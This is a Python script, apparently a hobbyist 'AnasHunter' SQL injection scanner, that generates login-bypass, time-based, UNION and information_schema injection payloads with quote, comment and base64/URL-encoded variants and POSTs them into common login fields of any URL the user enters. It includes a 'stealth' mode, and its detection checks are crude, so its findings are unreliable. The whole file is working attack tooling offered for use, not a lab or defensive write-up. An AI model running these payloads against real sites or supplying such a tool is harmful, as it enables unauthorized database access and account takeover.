# anas_sqli_scanner.py

import requests
import time
import argparse
import urllib.parse
import base64
from datetime import datetime
import os

# ===== Banner =====
def banner():
    os.system("clear")
    print('''
\033[91m
 █████╗ ███╗   ██╗ █████╗ ███████╗    ███████╗ ██████╗ ██╗     ██╗
██╔══██╗████╗  ██║██╔══██╗██╔════╝    ██╔════╝██╔═══██╗██║     ██║
███████║██╔██╗ ██║███████║███████╗    ███████╗██║   ██║██║     ██║
██╔══██║██║╚██╗██║██╔══██║╚════██║    ╚════██║██║▄▄ ██║██║     ██║
██║  ██║██║ ╚████║██║  ██║███████║    ███████║╚██████╔╝███████╗██║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
\033[0m''')

# ===== Arguments Parser =====
def parse_args():
    parser = argparse.ArgumentParser(description="AnasHunter Advanced SQLi Scanner")
    parser.add_argument("-u", "--url", help="Target URL", required=False)
    parser.add_argument("--stealth", help="Enable stealth mode", action="store_true")
    return parser.parse_args()

# ===== Payload Generator =====
def generate_payloads():
    base_payloads = [
        "' OR '1'='1",
        "admin'--",
        "admin'/*",
        "admin' or '1'='1'--",
        "admin' or 1=1--",
        "admin') or ('1'='1",
        "' or sleep(5)--",
        "' OR 1 GROUP BY CONCAT(0x3a,version())--",
        "' OR 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "' AND 1=0 UNION SELECT NULL,version(),NULL--",
        "' AND ascii(lower(substring((SELECT @@version),1,1))) > 97--",
        base64.b64encode(b"admin' OR '1'='1").decode(),
        urllib.parse.quote("admin' OR '1'='1")
    ]

    payloads = []
    for base in base_payloads:
        payloads.extend([
            base,
            base.replace("'", '"'),
            base + "-- -",
            base + "/*",
            base + " OR 1=1",
            base + " AND 1=1",
            urllib.parse.quote(base),
            base64.b64encode(base.encode()).decode()
        ])
    return list(set(payloads))[:1000]  # Up to 1000 unique payloads

# ===== SQLi Scanner =====
def scan_sql(url, stealth=False):
    fields = ["username", "user", "email", "login", "admin", "password"]
    payloads = generate_payloads()

    method = "POST"
    report = []
    vulnerable = False

    print("[*] Method detected:", method)
    print("[*] Payloads loaded:", len(payloads))
    print("[*] Stealth Mode:", "ON" if stealth else "OFF")
    print("-"*50)

    for payload in payloads:
        for field in fields:
            data = {field: payload}
            try:
                start = time.time()
                r = requests.post(url, data=data, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
                elapsed = time.time() - start

                if stealth and elapsed > 4:
                    msg = f"[+] Time-based SQLi detected on '{field}' using: {payload}"
                    print(msg)
                    report.append(msg)
                    vulnerable = True
                elif not stealth and ("mysql" in r.text.lower() or "syntax" in r.text.lower() or "error" in r.text.lower()):
                    msg = f"[+] Error-based SQLi detected on '{field}' using: {payload}"
                    print(msg)
                    report.append(msg)
                    vulnerable = True
                else:
                    print(f"[-] Not vulnerable on '{field}' | Payload: {payload}")
            except Exception as e:
                print(f"[!] Request failed: {e}")
            time.sleep(0.2)

    if not vulnerable:
        report.append("[x] No SQL injection found.")

    # === Report Output ===
    with open("sqli_report.txt", "w") as f:
        f.write("==== AnasHunter SQLi Report ====" + "\n")
        f.write(f"Target: {url}\n")
        f.write(f"Date: {datetime.now()}\n")
        f.write(f"Mode: {'Stealth' if stealth else 'Normal'}\n\n")
        for line in report:
            f.write(line + "\n")

    print("\n[✔] Scan complete. Report saved to sqli_report.txt")

# ===== Main Execution =====
if __name__ == "__main__":
    args = parse_args()
    if args.url:
        banner()
        scan_sql(args.url, args.stealth)
    else:
        banner()
        url = input("[+] Enter target URL: ")
        stealth = input("[?] Enable Stealth Mode (y/n): ").lower().startswith("y")
        scan_sql(url, stealth)
